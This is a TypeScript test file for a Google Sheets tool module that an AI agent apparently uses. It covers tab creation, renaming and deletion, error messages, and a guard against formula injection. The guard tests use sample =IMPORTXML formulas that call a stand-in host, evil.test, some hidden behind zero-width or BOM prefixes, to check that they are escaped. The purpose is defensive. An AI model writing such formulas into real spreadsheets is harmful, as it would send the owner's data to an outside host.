import { describe, expect, it } from "vitest";
import { CREATE, MUTATE } from "./annotations.js";
import {
  handleSheets,
  quoteTabForRange,
  sheetsTools,
  tabNameFromRange,
} from "./sheets.js";
import { fakeClient, payload } from "./fake-client.test-helper.js";

describe("tabNameFromRange", () => {
  it.each([
    ["Sheet1!A1:D10", "Sheet1"],
    ["'MCP Inventory'!A1:B1", "MCP Inventory"],
    ["'Bob''s Data'!A1", "Bob's Data"],
    ["A1:Z", undefined],
    ["'Broken!A1", undefined],
  ])("%s → %s", (range, expected) => {
    expect(tabNameFromRange(range)).toBe(expected);
  });
});

describe("quoteTabForRange", () => {
  it("quotes and escapes for A1 use", () => {
    expect(quoteTabForRange("Bob's Data")).toBe("'Bob''s Data'");
  });
});

describe("sheets_add_tab", () => {
  it("requires spreadsheet_id and title", () => {
    const tool = sheetsTools.find((t) => t.name === "sheets_add_tab");
    expect(tool?.inputSchema.required).toEqual(["spreadsheet_id", "title"]);
  });

  it("is a write that destroys nothing, pinned to the exact shape", () => {
    // toEqual, not toMatchObject: an exact-shape assertion is the only place
    // a stray or misspelled annotation key fails. Cross-tool coverage of the
    // creation shape lives in annotations.test.ts; this pins the tool this
    // file is about.
    const tool = sheetsTools.find((t) => t.name === "sheets_add_tab");
    expect(tool?.annotations).toEqual(CREATE("Add spreadsheet tab"));
  });

  it("sheets_create is likewise pinned: creating a file destroys nothing", () => {
    const tool = sheetsTools.find((t) => t.name === "sheets_create");
    expect(tool?.annotations).toEqual(CREATE("Create spreadsheet"));
  });


  it("adds the tab via batchUpdate and returns the reply's sheetId", async () => {
    const { client, calls } = fakeClient([
      {
        data: {
          replies: [
            { addSheet: { properties: { sheetId: 852183133, title: "Inventory" } } },
          ],
        },
      },
    ]);

    const result = await handleSheets(client, "sheets_add_tab", {
      spreadsheet_id: "sheet-1",
      title: "Inventory",
    });

    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({
      service: "sheets",
      resource: "spreadsheets",
      method: "batchUpdate",
      params: { spreadsheetId: "sheet-1" },
      jsonBody: { requests: [{ addSheet: { properties: { title: "Inventory" } } }] },
    });
    expect(payload(result)).toEqual({
      sheetId: 852183133,
      title: "Inventory",
    });
  });

  it("writes headers to row 1 of the new tab, range-quoted and RAW", async () => {
    const { client, calls } = fakeClient([
      { data: { replies: [{ addSheet: { properties: { sheetId: 7, title: "Q3 Data" } } }] } },
      { data: {} },
    ]);

    await handleSheets(client, "sheets_add_tab", {
      spreadsheet_id: "sheet-1",
      title: "Q3 Data",
      headers: ["Name", "Owner"],
    });

    expect(calls).toHaveLength(2);
    // RAW: headers are labels; "=Total" must land as text, not a formula.
    expect(calls[1]).toMatchObject({
      resource: "spreadsheets.values",
      method: "update",
      params: { range: "'Q3 Data'!A1", valueInputOption: "RAW" },
      jsonBody: { values: [["Name", "Owner"]] },
    });
  });
});

describe("missing-tab error context", () => {
  const parseFailure =
    'API error: {"error":{"code":400,"message":"Unable to parse range: MCP Inventory!A1:B1","status":"INVALID_ARGUMENT"}}';
  const twoTabs = {
    data: { sheets: [{ properties: { title: "Sheet1" } }, { properties: { title: "Notes" } }] },
  };

  it("names the missing tab and lists the ones that exist", async () => {
    const { client } = fakeClient([{ throws: parseFailure }, twoTabs]);

    await expect(
      handleSheets(client, "sheets_update", {
        spreadsheet_id: "sheet-1",
        range: "MCP Inventory!A1:B1",
        values: [["a", "b"]],
      })
    ).rejects.toThrow(
      'No sheet named "MCP Inventory" in this spreadsheet. ' +
        'Existing tabs: "Sheet1", "Notes". Create it first with sheets_add_tab.'
    );
  });

  it.each([
    ["sheets_read", { spreadsheet_id: "s", range: "Ghost!A1" }],
    ["sheets_append", { spreadsheet_id: "s", range: "Ghost!A1", values: [["x"]] }],
  ])("enriches %s the same way", async (tool, args) => {
    const { client } = fakeClient([
      { throws: "Unable to parse range: Ghost!A1" },
      { data: { sheets: [{ properties: { title: "Sheet1" } }] } },
    ]);
    await expect(handleSheets(client, tool, { ...args })).rejects.toThrow(
      'No sheet named "Ghost"'
    );
  });

  it("covers sheets_add_tab's own header write through the same seam", async () => {
    const { client } = fakeClient([
      { data: { replies: [{ addSheet: { properties: { sheetId: 7, title: "Ghost" } } }] } },
      { throws: "Unable to parse range: 'Ghost'!A1" },
      { data: { sheets: [{ properties: { title: "Sheet1" } }] } },
    ]);

    await expect(
      handleSheets(client, "sheets_add_tab", {
        spreadsheet_id: "s",
        title: "Ghost",
        headers: ["a"],
      })
    ).rejects.toThrow('No sheet named "Ghost"');
  });

  it.each([
    [
      "the named tab actually exists",
      [
        { throws: parseFailure },
        { data: { sheets: [{ properties: { title: "MCP Inventory" } }] } },
      ],
      { spreadsheet_id: "s", range: "MCP Inventory!A1:B1", values: [["a"]] },
      2,
    ],
    [
      "the range has no tab prefix",
      [{ throws: "Unable to parse range: A1:ZZZ99" }],
      { spreadsheet_id: "s", range: "A1:ZZZ99", values: [["a"]] },
      1,
    ],
    [
      "the tab lookup itself fails",
      [{ throws: parseFailure }, { throws: "API error: permission denied" }],
      { spreadsheet_id: "s", range: "MCP Inventory!A1", values: [["a"]] },
      2,
    ],
  ] as const)(
    "keeps the original error when %s",
    async (_case, plan, args, expectedCalls) => {
      const { client, calls } = fakeClient([...plan]);
      await expect(handleSheets(client, "sheets_update", { ...args })).rejects.toThrow(
        "Unable to parse range"
      );
      expect(calls).toHaveLength(expectedCalls);
    }
  );

  it("leaves unrelated errors untouched, without a tab lookup", async () => {
    const { client, calls } = fakeClient([
      { throws: "API error: rate limit exceeded" },
    ]);

    await expect(
      handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "Sheet1!A1" })
    ).rejects.toThrow("rate limit exceeded");
    expect(calls).toHaveLength(1);
  });
});

describe("tab lifecycle", () => {
  const twoTabs = {
    data: {
      sheets: [
        { properties: { sheetId: 0, title: "Sheet1" } },
        { properties: { sheetId: 852183133, title: "Inventory" } },
      ],
    },
  };

  it("renames by title, resolving the sheetId itself", async () => {
    const { client, calls } = fakeClient([twoTabs, { data: {} }]);

    const result = await handleSheets(client, "sheets_rename_tab", {
      spreadsheet_id: "s",
      title: "Inventory",
      new_title: "Vendors",
    });

    expect(calls[1]).toMatchObject({
      method: "batchUpdate",
      jsonBody: {
        requests: [
          {
            updateSheetProperties: {
              properties: { sheetId: 852183133, title: "Vendors" },
              fields: "title",
            },
          },
        ],
      },
    });
    expect(payload(result)).toEqual({
      sheetId: 852183133,
      title: "Vendors",
      previousTitle: "Inventory",
    });
  });

  it("deletes a tab by title", async () => {
    const { client, calls } = fakeClient([twoTabs, { data: {} }]);

    await handleSheets(client, "sheets_delete_tab", {
      spreadsheet_id: "s",
      title: "Inventory",
    });

    expect(calls[1]).toMatchObject({
      method: "batchUpdate",
      jsonBody: { requests: [{ deleteSheet: { sheetId: 852183133 } }] },
    });
  });

  it.each(["sheets_rename_tab", "sheets_delete_tab"])(
    "%s names the real tabs when the title does not exist",
    async (tool) => {
      const { client } = fakeClient([twoTabs]);
      await expect(
        handleSheets(client, tool, {
          spreadsheet_id: "s",
          title: "Ghost",
          new_title: "x",
        })
      ).rejects.toThrow(
        'No sheet named "Ghost" in this spreadsheet. Existing tabs: "Sheet1", "Inventory".'
      );
    }
  );

  it("clears values without touching the tab", async () => {
    const { client, calls } = fakeClient([
      { data: { clearedRange: "Inventory!A1:D50" } },
    ]);

    const result = await handleSheets(client, "sheets_clear", {
      spreadsheet_id: "s",
      range: "Inventory",
    });

    expect(calls[0]).toMatchObject({
      resource: "spreadsheets.values",
      method: "clear",
      params: { range: "Inventory" },
    });
    expect(payload(result)).toEqual({
      clearedRange: "Inventory!A1:D50",
    });
  });

  it("titles the destructive tab tool so a prompt cannot be misread", () => {
    // Read alone in a confirmation dialog by someone who thinks they are
    // closing a view, this has to say that rows are going away.
    const del = sheetsTools.find((t) => t.name === "sheets_delete_tab");
    expect(del?.annotations).toEqual(
      MUTATE("Delete a spreadsheet tab and all its rows")
    );
    // Its non-destructive neighbour, so clearing is the obvious choice for
    // "empty this" rather than deleting the tab.
    const clear = sheetsTools.find((t) => t.name === "sheets_clear");
    expect(clear?.annotations).toEqual(
      MUTATE("Erase the values in a spreadsheet range")
    );
    const rename = sheetsTools.find((t) => t.name === "sheets_rename_tab");
    expect(rename?.annotations).toEqual(CREATE("Rename a spreadsheet tab"));
  });
});

/** An agent writing to a sheet is usually writing text it read somewhere the
 * sheet's owner does not control. Sheets formulas reach the network, so a
 * leading `=` turns "log this in my tracker" into an exfiltration primitive. */
describe("formula injection guard", () => {
  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s escapes values that would execute", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["=IMPORTXML(\"https://evil.test\",\"//a\")", "+1+1"]],
    });

    // Sheets strips the leading apostrophe on read, so the stored value is
    // the original string — the caller sees no difference, the formula never
    // runs. Measured: `=` and `+` execute; `-`, `@` and a leading space do not.
    expect(calls[0].jsonBody).toEqual({
      values: [["'=IMPORTXML(\"https://evil.test\",\"//a\")", "'+1+1"]],
    });
  });

  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s leaves harmless values untouched", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
    });

    expect(calls[0].jsonBody).toEqual({
      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
    });
  });

  it("still writes USER_ENTERED, so numbers stay numbers", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [["5", "10"]],
    });

    // RAW would neutralise the same attack, but silently: =SUM() over
    // RAW-written numbers returns 0, not the total and not an error.
    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
  });

  it("writes a real formula when the caller explicitly asks for one", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, "sheets_update", {
      spreadsheet_id: "s",
      range: "Sheet1!C1",
      values: [["=SUM(A1:B1)"]],
      parse_formulas: true,
    });

    expect(calls[0].jsonBody).toEqual({ values: [["=SUM(A1:B1)"]] });
  });

  it("offers the opt-out on both writing tools", () => {
    // A guard with no documented way past it gets worked around with gws_run,
    // which has no guard at all.
    for (const name of ["sheets_update", "sheets_append"]) {
      const tool = sheetsTools.find((t) => t.name === name);
      expect(tool?.inputSchema.properties).toHaveProperty("parse_formulas");
    }
  });
});

/** The raw-first-character version of this guard let invisible-prefixed
 * payloads through. A plain leading space was measured inert in Sheets; BOM
 * was NOT, and BOM is a format character rather than whitespace, which is the
 * evidence that Sheets skips leading zero-width characters before parsing.
 *
 * The zero-width cases below were not measured against the live API. They are
 * covered because the escape is lossless: guessing wide costs an apostrophe
 * Sheets strips on read, guessing narrow costs an injection. */
describe("formula guard ignores leading invisible characters", () => {
  it.each([
    ["tab", "\t=IMPORTXML(\"https://evil.test\",\"//a\")"],
    ["newline", "\n=1+1"],
    ["zwsp", "​=IMPORTXML(\"https://evil.test\",\"//a\")"],
    ["zwnj", "‌=1+1"],
    ["word joiner", "⁠=1+1"],
    ["soft hyphen", "­=1+1"],
    ["bidi mark", "‎=1+1"],
    ["nbsp", " =1+1"],
    ["bom", "﻿=1+1"],
    ["plain space", " +1+1"],
  ])("escapes a %s-prefixed formula", async (_label, payload) => {
    const { client, calls } = fakeClient([{ data: {} }]);
    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [[payload]],
    });
    expect((calls[0].jsonBody as { values: string[][] }).values[0][0]).toBe(
      `'${payload}`
    );
  });

  it("does not escape whitespace-only or ordinary text", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);
    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [["   ", "  hello", "-1-1", ""]],
    });
    expect(calls[0].jsonBody).toEqual({
      values: [["   ", "  hello", "-1-1", ""]],
    });
  });
});
